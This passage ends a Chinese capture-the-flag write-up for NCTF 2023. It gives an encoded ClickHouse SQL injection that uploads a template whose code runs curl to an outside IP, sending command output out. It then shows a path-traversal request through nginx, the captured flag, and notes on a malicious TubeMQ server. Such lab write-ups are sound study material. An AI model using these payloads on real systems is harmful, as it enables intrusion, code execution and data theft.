+<span class="language-llvm">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> * from url(&#x27;http://<span class="hljs-keyword">default</span>:<span class="hljs-keyword">default</span><span class="hljs-title">@db</span>:<span class="hljs-number">8123</span>/?query<span class="hljs-operator">=</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2553</span><span class="hljs-variable">%2545</span><span class="hljs-variable">%2552</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2554</span><span class="hljs-variable">%254</span>f<span class="hljs-variable">%2520</span><span class="hljs-variable">%2546</span><span class="hljs-variable">%2555</span><span class="hljs-variable">%254</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2549</span><span class="hljs-variable">%254</span>f<span class="hljs-variable">%254</span>e<span class="hljs-variable">%2520</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>b<span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2564</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2538</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2561</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2554</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2552</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2577</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2578</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2567</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2575</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2575</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2558</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2541</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>b<span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2527</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2532</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2556</span><span class="hljs-variable">%2541</span><span class="hljs-variable">%254</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2555</span><span class="hljs-variable">%2545</span><span class="hljs-variable">%2553</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2528</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2544</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2573</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%253</span>a<span class="hljs-variable">%2520</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2564</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2522</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2579</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2522</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%2520</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2522</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%252</span>e<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2522</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2543</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%2554</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2520</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2578</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2524</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2564</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%255</span>f<span class="hljs-variable">%255</span>f<span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%255</span>f<span class="hljs-variable">%255</span>f<span class="hljs-variable">%2528</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2573</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2573</span><span class="hljs-variable">%2579</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2528</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2563</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2531</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2538</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2536</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2537</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%253</span>a<span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%2537</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%253</span>f<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%253</span>d<span class="hljs-variable">%2560</span><span class="hljs-variable">%252</span>f<span class="hljs-variable">%2572</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2564</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%257</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%2560</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%255</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2574</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%252</span>d<span class="hljs-variable">%252</span>d<span class="hljs-variable">%2527</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%253</span>b&#x27;<span class="hljs-punctuation">,</span>&#x27;TabSeparatedRaw&#x27;<span class="hljs-punctuation">,</span>&#x27;<span class="hljs-keyword">x</span> String&#x27;))</span></code></pre></div>
+
+<p>文件上传成功，最后post请求&#x2F;，同样还要经过nginx反向代理</p>
+<div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/	HTTP/1.1/../../api/ping</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.71.184.68:8013
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>8
+
+<span class="language-abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>test</span></code></pre></div>
+
+<p><img src="/../images/NCTF2023/image-20231230023909795.png" srcset="/img/loading.gif" lazyload alt="image-20231230023909795"></p>
+<p>base64解码</p>
+<p><code>nctf&#123;hacking_clickhouse_database_qkh7ZrPqHK2GVHky&#125;</code></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><code>EvilMQ</code>就算了，知识点分开看看记一下，</p>
+<p>要编写恶意 TubeMQ Server</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.inlong</span><span class="hljs-selector-class">.tubemq</span><span class="hljs-selector-class">.corerpc</span><span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.NettyRpcServer</span>.NettyServerHandler#channelRead</code></pre></div>
+
+<p>控制返回的数据</p>
+<p>其次还有绕过RASP，学到了新的方法</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd">NCTF 2023 Official Writeup - 飞书云文档 (feishu.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/</a></p>
 
                 
               </div>
